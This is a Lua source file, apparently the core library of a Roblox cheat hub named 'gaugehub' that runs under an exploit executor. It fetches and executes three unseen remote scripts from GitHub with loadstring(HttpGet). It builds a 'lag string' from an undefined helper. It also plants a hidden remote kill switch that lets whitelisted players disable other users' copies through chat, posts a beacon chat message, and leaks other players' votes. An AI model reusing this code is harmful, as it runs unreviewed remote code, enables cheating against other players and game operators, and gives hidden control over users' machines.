local wsPlayers = game:GetService("Players")
local wsLocalPlayer = wsPlayers.LocalPlayer
local wsReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

local ayaLogCooldowns = {}
local ayaLogSuppressed = {}
local function ayaLog(msg)
    msg = tostring(msg)
    local now = tick()
    local last = ayaLogCooldowns[msg]
    if last and (now - last) < 2 then
        ayaLogSuppressed[msg] = (ayaLogSuppressed[msg] or 0) + 1
        return
    end
    if ayaLogSuppressed[msg] and ayaLogSuppressed[msg] > 0 then
        print("[GaugeHub] (" .. ayaLogSuppressed[msg] .. " repeats suppressed)")
        ayaLogSuppressed[msg] = 0
    end
    ayaLogCooldowns[msg] = now
    print("[GaugeHub] " .. msg)
end

local _ = loadstring(game:HttpGet("https://raw.githubusercontent.com/f4ed67/test/refs/heads/main/funny.lua"))()
local _ = loadstring(game:HttpGet("https://raw.githubusercontent.com/f4ed67/test/refs/heads/main/d.lua"))()

local function VerifiedIcon() return "" end
local function DeveloperIcon() return " [🔨Moderator]" end

local function touchPart(target)
    if target and target:IsA("BasePart") then
        local hrp = wsLocalPlayer.Character and wsLocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        firetouchinterest(hrp, target, 0)
        task.wait()
        firetouchinterest(hrp, target, 1)
    end
end

local Luna = loadstring(game:HttpGet("https://raw.githubusercontent.com/f4ed67/test/refs/heads/main/cc.lua", true))()

local notif
notif = function(title, text, notifType)
    local iconName = "check_circle"
    if notifType == 2 then iconName = "error"
    elseif notifType == 3 then iconName = "info" end
    pcall(function()
        Luna:Notification({
            Title = tostring(title or "gaugehub"),
            Icon = iconName,
            ImageSource = "Material",
            Content = tostring(text or "")
        })
    end)
end

getgenv().GaugeHubLagString = (function()
    local ok, res = pcall(function() return returnFucker() end)
    if ok and res then return res end
    return ""
end)()

local whitelisturl = "https://raw.githubusercontent.com/f4ed67/test/main/whitelists.txt"
if setfpscap then pcall(function() setfpscap(999) end) end

local WHITELIST = {}
local whitelistLoaded = false
local function loadWhitelist()
    local ok, result = pcall(function() return game:HttpGet(whitelisturl, true) end)
    if not ok or not result or result == "" then
        WHITELIST = {[5040205276] = true}
        return
    end
    local count = 0
    for line in result:gmatch("[^\r\n]+") do
        local cleaned = line:gsub("%s+", "")
        if cleaned ~= "" and not cleaned:match("^#") then
            local id = tonumber(cleaned)
            if id then WHITELIST[id] = true; count = count + 1 end
        end
    end
    WHITELIST[5040205276] = true
    whitelistLoaded = true
    ayaLog("Loaded " .. count .. " whitelisted IDs.")
end
loadWhitelist()
local isWhitelisted = WHITELIST[wsLocalPlayer.UserId] == true
ayaLog(isWhitelisted and "hi, private user" or "hi, public user")

task.spawn(function()
    task.wait(0.5)
    Luna:Notification({
        Title = "gaugehub",
        Icon = isWhitelisted and "verified" or "public",
        ImageSource = "Material",
        Content = isWhitelisted and "Registered, Private user." or "Registered, Public user."
    })
end)

wsPlayers.PlayerAdded:Connect(function(player)
    if player == wsLocalPlayer then return end
    if not whitelistLoaded then return end
    if WHITELIST[player.UserId] then
        ayaLog(player.Name .. " joined (private user)")
        return
    end
    ayaLog(player.Name .. " joined (public user)")
    task.wait(1.5)
    if not player.Parent then return end
    Luna:Notification({
        Title = "gaugehub",
        Icon = "person",
        ImageSource = "Material",
        Content = player.Name .. " is a public user in the lobby."
    })
end)

wsPlayers.PlayerRemoving:Connect(function(player)
    ayaLog(player.Name .. " left the server")
end)

task.spawn(function()
    task.wait(2)
    if not isWhitelisted then
        pcall(function()
            wsReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("helloimusinggaugehub", "All")
        end)
    end
end)

local disabledOverlay = nil
local function findLunaGui()
    local roots = {game:GetService("CoreGui"), wsLocalPlayer:FindFirstChild("PlayerGui")}
    for _, root in ipairs(roots) do
        if root then
            for _, obj in ipairs(root:GetChildren()) do
                if obj:IsA("ScreenGui") and obj.Name ~= "GaugeDisabledOverlay" then
                    for _, d in ipairs(obj:GetDescendants()) do
                        if d:IsA("TextLabel") and d.Text:find("gaugehub") then return obj end
                    end
                end
            end
        end
    end
    return nil
end

local function showOverlay()
    if disabledOverlay then return end
    local pg = wsLocalPlayer:FindFirstChild("PlayerGui")
    if not pg then return end
    local gui = Instance.new("ScreenGui")
    gui.Name = "GaugeDisabledOverlay"
    gui.ResetOnSpawn = false
    gui.DisplayOrder = 2147483647
    gui.IgnoreGuiInset = true
    gui.Parent = pg
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.5
    frame.BorderSizePixel = 0
    frame.Active = true
    frame.Parent = gui
    local txt = Instance.new("TextLabel")
    txt.Size = UDim2.new(1, 0, 0.15, 0)
    txt.Position = UDim2.new(0, 0, 0.42, 0)
    txt.BackgroundTransparency = 1
    txt.Text = "ur'e currently disabled lolol"
    txt.TextColor3 = Color3.fromRGB(255, 60, 60)
    txt.TextStrokeTransparency = 0
    txt.Font = Enum.Font.GothamBlack
    txt.TextScaled = true
    txt.Parent = frame
    disabledOverlay = gui
end

local function hideOverlay()
    if disabledOverlay then disabledOverlay:Destroy(); disabledOverlay = nil end
end

getgenv().GaugeHubActiveFeatures = getgenv().GaugeHubActiveFeatures or {}
getgenv().GaugeHubTools = getgenv().GaugeHubTools or {}
getgenv().GaugeHubDisabledSnapshot = nil

local function disableAllFeatures()
    local snapshot = {}
    for _, feature in ipairs(getgenv().GaugeHubActiveFeatures) do
        if feature.enabled then
            table.insert(snapshot, feature)
            pcall(function() feature.callback(false) end)
            feature.enabled = false
        end
    end
    getgenv().GaugeHubDisabledSnapshot = snapshot
    return #snapshot
end

local function enableAllFeatures()
    local snapshot = getgenv().GaugeHubDisabledSnapshot
    if not snapshot then return 0 end
    for _, feature in ipairs(snapshot) do
        pcall(function() feature.callback(true) end)
        feature.enabled = true
    end
    getgenv().GaugeHubDisabledSnapshot = nil
    return #snapshot
end

local function setDisabled(state)
    if isWhitelisted then return end
    if state then
        pcall(disableAllFeatures)
        showOverlay()
        local lunaGui = findLunaGui()
        if lunaGui then lunaGui.Enabled = false end
        notif("gaugehub", "ur'e currently disabled lolol", 2)
    else
        hideOverlay()
        local lunaGui = findLunaGui()
        if lunaGui then lunaGui.Enabled = true end
        pcall(enableAllFeatures)
        notif("gaugehub", "re-enabled", 1)
    end
end

local function handleCommand(sender, msg)
    if not WHITELIST[sender.UserId] then return end
    local cmd = msg:match("^[/%.!](%S+)%s*(.*)")
    if not cmd then return end
    cmd = cmd:lower()
    if cmd == "disable" then setDisabled(true)
    elseif cmd == "enable" then setDisabled(false) end
end

local function hookPlr(plr) plr.Chatted:Connect(function(m) handleCommand(plr, m) end) end
for _, plr in ipairs(wsPlayers:GetPlayers()) do
    if plr ~= wsLocalPlayer then hookPlr(plr) end
end
wsPlayers.PlayerAdded:Connect(function(plr)
    if plr ~= wsLocalPlayer then hookPlr(plr) end
end)

local ReplicatedStorage = wsReplicatedStorage
local voteDetectionEnabled = false
local voteConnection
local function monitorVotes()
    local Season = ReplicatedStorage:WaitForChild("Season")
    local Voting = Season:WaitForChild("Voting")
    local VotesFolder = Voting:WaitForChild("Votes")
    return VotesFolder.ChildAdded:Connect(function(child)
        if voteDetectionEnabled and (child:IsA("ObjectValue") or child:IsA("StringValue") or child:IsA("IntValue") or child:IsA("NumberValue")) then
            local whoVoted = ReplicatedStorage.Season.Players[child.Value].Value
            local gotVoted = ReplicatedStorage.Season.Players[child.Name].Value
            notif("voting", whoVoted .. " voted " .. gotVoted, 3)
        end
    end)
end
local function chatVotes()
    local Season = ReplicatedStorage:WaitForChild("Season")
    local Voting = Season:WaitForChild("Voting")
    local VotesFolder = Voting:WaitForChild("Votes")
    return VotesFolder.ChildAdded:Connect(function(child)
        if voteDetectionEnabled and (child:IsA("ObjectValue") or child:IsA("StringValue") or child:IsA("IntValue") or child:IsA("NumberValue")) then
            local whoVoted = ReplicatedStorage.Season.Players[child.Value].Value
            local gotVoted = ReplicatedStorage.Season.Players[child.Name].Value
            ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(whoVoted .. " has voted " .. gotVoted, "All")
        end
    end)
end

local Window = Luna:CreateWindow({
    Name = "gaugehub v0.9",
    Subtitle = "a script by f9ed",
    LogoID = "82795327169782",
    LoadingEnabled = true,
    LoadingTitle = "loadin, please wait g..",
    LoadingSubtitle = "welcome!",
    Bind = Enum.KeyCode.LeftControl,
    ConfigSettings = {RootFolder = nil, ConfigFolder = "gaugehub"},
})
notif("gaugehub", "loaded gaugehub", 1)

local assets = workspace:FindFirstChild("Assets")
local isMovies = assets and assets:FindFirstChild("Alien") ~= nil
local isExpedition = assets and (assets:FindFirstChild("Maldives") ~= nil or assets:FindFirstChild("France") ~= nil)
local isCamp = not isMovies and not isExpedition
local currentMode = isCamp and "camp" or isMovies and "movies" or "expedition"
ayaLog("mode detected: " .. currentMode)

local featureIndex = {}
local featureTrackers = {}

local function registerDynamicFeature(name, description, tab, mode)
    if not name then return end
    for _, feature in ipairs(featureIndex) do
        if string.lower(tostring(feature.name)) == string.lower(tostring(name)) and feature.tab == tab and feature.mode == mode then return end
    end
    table.insert(featureIndex, {name = tostring(name), description = tostring(description or ""), tab = tab, mode = mode})
end

local function installFeatureTracker(tabObject, tabName, mode)
    if not tabObject or featureTrackers[tabObject] then return end
    featureTrackers[tabObject] = true
    local function wrapSimpleMethod(methodName, kind)
        local ok, original = pcall(function() return tabObject[methodName] end)
        if not ok or type(original) ~= "function" then return end
        tabObject[methodName] = function(self, config, ...)
            local obj = original(self, config, ...)
            if type(config) == "table" and config.Name then
                registerDynamicFeature(config.Name, config.Description, tabName, mode)
                table.insert(getgenv().GaugeHubTools, {
                    kind = kind, name = tostring(config.Name),
                    description = tostring(config.Description or ""),
                    tab = tabName, obj = obj, callback = config.Callback,
                })
            end
            return obj
        end
    end
    wrapSimpleMethod("CreateButton", "button")
    wrapSimpleMethod("CreateInput", "input")
    wrapSimpleMethod("CreateSlider", "slider")
    wrapSimpleMethod("CreateDropdown", "dropdown")
    wrapSimpleMethod("CreateKeybind", "keybind")

    local ok, originalToggle = pcall(function() return tabObject.CreateToggle end)
    if ok and type(originalToggle) == "function" then
        tabObject.CreateToggle = function(self, config, ...)
            local userCallback
            if type(config) == "table" and type(config.Callback) == "function" then userCallback = config.Callback end
            local toggleObj = originalToggle(self, config, ...)
            if type(config) == "table" and config.Name then
                registerDynamicFeature(config.Name, config.Description, tabName, mode)
                if userCallback then
                    local record = { name = tostring(config.Name), enabled = false, callback = userCallback, toggleObj = toggleObj }
                    local wrapper = function(Value)
                        record.enabled = Value and true or false
                        return userCallback(Value)
                    end
                    config.Callback = wrapper
                    if toggleObj then
                        pcall(function() if toggleObj.Callback ~= nil then toggleObj.Callback = wrapper end end)
                    end
                    table.insert(getgenv().GaugeHubActiveFeatures, record)
                end
                table.insert(getgenv().GaugeHubTools, {
                    kind = "toggle", name = tostring(config.Name),
                    description = tostring(config.Description or ""),
                    tab = tabName, obj = toggleObj, callback = config.Callback,
                })
            end
            return toggleObj
        end
    end
end

local function createSafeTab(options)
    local tries = {
        options,
        {Name = "AI", Icon = options.Icon, ImageSource = options.ImageSource, ShowTitle = options.ShowTitle},
        {Name = "AI", Icon = "history", ImageSource = "Material", ShowTitle = true},
        {Name = "AI", Icon = "search", ImageSource = "Material", ShowTitle = true},
    }
    for _, opts in ipairs(tries) do
        local ok, tab = pcall(function() return Window:CreateTab(opts) end)
        if ok and tab then return tab end
    end
    return nil
end

local lib = {
    ayaLog = ayaLog,
    notif = notif,
    VerifiedIcon = VerifiedIcon,
    DeveloperIcon = DeveloperIcon,
    touchPart = touchPart,
    Luna = Luna,
    Window = Window,
    wsPlayers = wsPlayers,
    wsLocalPlayer = wsLocalPlayer,
    wsReplicatedStorage = wsReplicatedStorage,
    HttpService = HttpService,
    RunService = RunService,
    WHITELIST = WHITELIST,
    isWhitelisted = isWhitelisted,
    assets = assets,
    isCamp = isCamp,
    isMovies = isMovies,
    isExpedition = isExpedition,
    currentMode = currentMode,
    featureIndex = featureIndex,
    registerDynamicFeature = registerDynamicFeature,
    installFeatureTracker = installFeatureTracker,
    createSafeTab = createSafeTab,
    monitorVotes = monitorVotes,
    chatVotes = chatVotes,
    setVoteDetection = function(v) voteDetectionEnabled = v end,
    getVoteDetection = function() return voteDetectionEnabled end,
    getVoteConnection = function() return voteConnection end,
    setVoteConnection = function(c) voteConnection = c end,
    tabs = {},
}

function lib.finishSearch()
    local SearchTab = lib.tabs.search
    if not SearchTab then return end
    local selectedFeature
    local function featureMatchesMode(feature)
        if not feature.mode then return true end
        return feature.mode == currentMode
    end
    local function getAvailableFeatures()
        local available = {}
        for _, feature in ipairs(featureIndex) do
            if featureMatchesMode(feature) then table.insert(available, feature) end
        end
        return available
    end
    local function findFeature(name)
        name = tostring(name or "")
        for _, feature in ipairs(featureIndex) do
            if feature.name == name then return feature end
        end
    end
    local function getFeatureTab(feature)
        return lib.tabs[feature.tab]
    end
    local function findTabButton(tabName)
        local wanted = string.lower(tostring(tabName))
        local roots = {game:GetService("CoreGui"), wsLocalPlayer:FindFirstChild("PlayerGui")}
        for _, root in ipairs(roots) do
            if not root then continue end
            local found
            pcall(function()
                for _, object in ipairs(root:GetDescendants()) do
                    if object:IsA("TextLabel") and string.lower(tostring(object.Text or "")) == wanted then
                        local walker = object
                        for _ = 1, 12 do
                            if not walker then break end
                            if walker:IsA("GuiButton") then found = walker; return end
                            local interact = walker:FindFirstChild("Interact", true)
                            if interact and interact:IsA("GuiButton") then found = interact; return end
                            walker = walker.Parent
                        end
                    end
                end
            end)
            if found then return found end
        end
    end
    local function findFeatureControl(feature)
        local wanted = string.lower(tostring(feature.name))
        local roots = {game:GetService("CoreGui"), wsLocalPlayer:FindFirstChild("PlayerGui")}
        for _, root in ipairs(roots) do
            if not root then continue end
            local found
            pcall(function()
                for _, object in ipairs(root:GetDescendants()) do
                    if object:IsA("TextLabel") or object:IsA("TextButton") then
                        local text = string.lower(tostring(object.Text or ""))
                        if text == wanted or string.find(text, wanted, 1, true) then
                            local parent = object.Parent
                            for _ = 1, 8 do
                                if not parent then break end
                                if parent:IsA("Frame") or parent:IsA("TextButton") then
                                    local stroke = parent:FindFirstChildWhichIsA("UIStroke", true)
                                    local interact = parent:FindFirstChild("Interact", true)
                                    if stroke or interact then found = parent; return end
                                end
                                parent = parent.Parent
                            end
                            if not found then found = object end
                            return
                        end
                    end
                end
            end)
            if found then return found end
        end
    end
    local function bringFeatureIntoView(feature)
        for _ = 1, 15 do
            local control = findFeatureControl(feature)
            if control then
                local scrolled = false
                pcall(function()
                    local scroll = control:FindFirstAncestorWhichIsA("ScrollingFrame")
                    if scroll then
                        local top = control.AbsolutePosition.Y - scroll.AbsolutePosition.Y
                        local bottom = top + control.AbsoluteSize.Y
                        local viewTop = 24
                        local viewBottom = scroll.AbsoluteSize.Y - 24
                        local current = scroll.CanvasPosition.Y
                        local targetY = current
                        if top < viewTop then targetY = current + top - viewTop
                        elseif bottom > viewBottom then targetY = current + (bottom - viewBottom)
                        else targetY = current + top - math.max(24, (scroll.AbsoluteSize.Y - control.AbsoluteSize.Y) / 2) end
                        local maxY = math.max(0, scroll.AbsoluteCanvasSize.Y - scroll.AbsoluteSize.Y)
                        targetY = math.clamp(targetY, 0, maxY)
                        scroll.CanvasPosition = Vector2.new(scroll.CanvasPosition.X, targetY)
                        scrolled = true
                    end
                end)
                if scrolled then return control end
            end
            task.wait(0.1)
        end
        return findFeatureControl(feature)
    end
    local function blinkFeatureName(control, feature)
        if not control then return end
        local label = control:IsA("TextLabel") or control:IsA("TextButton") and control or control:FindFirstChildWhichIsA("TextLabel", true)
        if not label then return end
        local originalText = label.Text
        task.spawn(function()
            local started = os.clock()
            local visible = true
            while os.clock() - started < 3 do
                label.Text = visible and ("⚪ " .. originalText) or originalText
                visible = not visible
                task.wait(0.25)
            end
            label.Text = originalText
        end)
    end
    local function showFeatureIdentifier(control, feature)
        notif("▼ HERE ▼", feature.name .. "\nis on the " .. tostring(feature.tab) .. " tab.", 3)
        if control then blinkFeatureName(control, feature) end
    end
    local function openFeatureTab(feature)
        local target = getFeatureTab(feature)
        if target and target.Activate then pcall(function() target:Activate() end) end
        local btn = findTabButton(feature.tab)
        if btn then
            if btn.Activate then pcall(function() btn:Activate() end) end
            if btn.MouseButton1Click then pcall(function() btn.MouseButton1Click:Fire() end) end
        end
        task.wait(0.5)
        local control = bringFeatureIntoView(feature)
        if not control then task.wait(0.3); control = bringFeatureIntoView(feature) end
        if control then showFeatureIdentifier(control, feature); return true end
        if target and target.Activate then pcall(function() target:Activate() end) end
        task.wait(0.4)
        control = bringFeatureIntoView(feature)
        if control then showFeatureIdentifier(control, feature); return true end
        return false
    end
    pcall(function()
        SearchTab:CreateDropdown({
            Name = "features",
            Description = "search for features.",
            Options = (function()
                local t = {}
                for _, f in ipairs(getAvailableFeatures()) do table.insert(t, f.name) end
                if #t == 0 then t = {"no features"} end
                return t
            end)(),
            CurrentOption = {(getAvailableFeatures()[1] or {name = "no features"}).name},
            MultipleOptions = false,
            Callback = function(Value)
                local name = type(Value) == "table" and Value[1] or Value
                selectedFeature = findFeature(name)
                if selectedFeature then openFeatureTab(selectedFeature) end
            end
        })
    end)
end

return lib